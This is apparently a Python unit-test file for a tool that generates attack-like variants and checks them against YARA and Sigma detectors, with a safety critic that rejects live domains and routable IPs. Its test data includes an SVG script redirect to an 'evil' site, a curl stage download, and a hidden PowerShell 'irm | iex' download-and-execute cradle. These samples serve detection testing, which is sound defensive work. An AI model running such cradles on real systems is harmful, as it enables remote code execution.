import unittest
from pathlib import Path

from tools.swarm.config import OperatorDirective, SafetyConstraints
from tools.swarm.craftsmen.process_craftsman import ProcessCraftsman
from tools.swarm.craftsmen.svg_craftsman import SvgCraftsman
from tools.swarm.critic import SwarmCritic
from tools.swarm.detectors import SigmaDetector, YaraDetector
from tools.swarm.models import Variant
from tools.swarm.orchestrator import SwarmOrchestrator


class SwarmCriticTests(unittest.TestCase):
    """Verifies that the Critic enforces strict sandbox safety and syntax standards."""

    def setUp(self):
        self.critic = SwarmCritic()

    def test_critic_rejects_non_approved_domain(self):
        variant = Variant(
            id="test-1",
            target_type="yara",
            axis="syntax",
            mutation_name="bad_domain",
            description="Testing live domain rejection",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>location.href="https://evil-live-site.com";</script></svg>',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertIn("Forbidden destination", verdict.reason)

    def test_critic_rejects_routable_ip(self):
        variant = Variant(
            id="test-2",
            target_type="sigma",
            axis="lolbin",
            mutation_name="bad_ip",
            description="Testing IP rejection",
            payload={
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": "C:\\Windows\\System32\\curl.exe",
                "CommandLine": "curl.exe http://198.51.100.25/stage.bin",
            },
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertIn("Routable IPv4", verdict.reason)

    def test_critic_rejects_invalid_xml_syntax(self):
        variant = Variant(
            id="test-3",
            target_type="yara",
            axis="structural",
            mutation_name="malformed_xml",
            description="Testing broken XML tags",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>unclosed tag',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertFalse(verdict.syntax_valid)

    def test_critic_approves_safe_reserved_domain(self):
        variant = Variant(
            id="test-4",
            target_type="yara",
            axis="structural",
            mutation_name="valid_svg",
            description="Testing safe approved domain",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>location.href="https://safe-test.invalid/p";</script></svg>',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertTrue(verdict.passed, f"Safe variant rejected: {verdict.reason}")


class SwarmCraftsmanTests(unittest.TestCase):
    """Verifies that Craftsmen generate variants across requested cycles."""

    def test_svg_craftsman_generation(self):
        craftsman = SvgCraftsman()
        all_variants = []
        for cycle in (1, 2, 3):
            variants = craftsman.generate_variants(cycle=cycle)
            self.assertGreater(len(variants), 0, f"Cycle {cycle} produced 0 SVG variants")
            all_variants.extend(variants)
        self.assertGreaterEqual(len(all_variants), 8)

    def test_process_craftsman_generation(self):
        craftsman = ProcessCraftsman()
        all_variants = []
        for cycle in (1, 2, 3):
            variants = craftsman.generate_variants(cycle=cycle)
            self.assertGreater(len(variants), 0, f"Cycle {cycle} produced 0 process variants")
            all_variants.extend(variants)
        self.assertGreaterEqual(len(all_variants), 8)


class SwarmDetectorTests(unittest.TestCase):
    """Verifies local detector execution against synthetic variants."""

    def test_yara_detector_execution(self):
        detector = YaraDetector()
        variant = Variant(
            id="yara-test",
            target_type="yara",
            axis="structural",
            mutation_name="test_svg",
            description="test",
            payload=(
                '<svg xmlns="http://www.w3.org/2000/svg">\n'
                '  <script>window.location.href = "https://match.invalid";</script>\n'
                '</svg>'
            ),
            cycle=1,
        )
        result = detector.evaluate(variant)
        self.assertTrue(result.detected)

    def test_sigma_detector_execution(self):
        detector = SigmaDetector()
        variant = Variant(
            id="sigma-test",
            target_type="sigma",
            axis="syntax",
            mutation_name="test_proc",
            description="test",
            payload={
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -w hidden -c \"irm https://test.invalid | iex\"",
            },
            cycle=1,
        )
        result = detector.evaluate(variant)
        self.assertTrue(result.detected)


class SwarmOrchestratorEndToEndTests(unittest.TestCase):
    """Verifies end-to-end multi-cycle closed-loop runs for both YARA and Sigma."""

    def test_yara_orchestrator_run(self):
        directive = OperatorDirective(
            target="yara",
            max_cycles=2,
            variants_per_cycle=4,
        )
        orchestrator = SwarmOrchestrator(directive)
        boundary_map, results = orchestrator.run()

        self.assertEqual(boundary_map.target_type, "yara")
        self.assertEqual(boundary_map.cycles_completed, 2)
        self.assertGreater(boundary_map.total_generated, 0)
        self.assertGreater(boundary_map.critic_approved, 0)
        self.assertGreater(len(results), 0)

    def test_sigma_orchestrator_run(self):
        directive = OperatorDirective(
            target="sigma",
            max_cycles=2,
            variants_per_cycle=4,
        )
        orchestrator = SwarmOrchestrator(directive)
        boundary_map, results = orchestrator.run()

        self.assertEqual(boundary_map.target_type, "sigma")
        self.assertEqual(boundary_map.cycles_completed, 2)
        self.assertGreater(boundary_map.total_generated, 0)
        self.assertGreater(boundary_map.critic_approved, 0)
        self.assertGreater(len(results), 0)


if __name__ == "__main__":
    unittest.main()
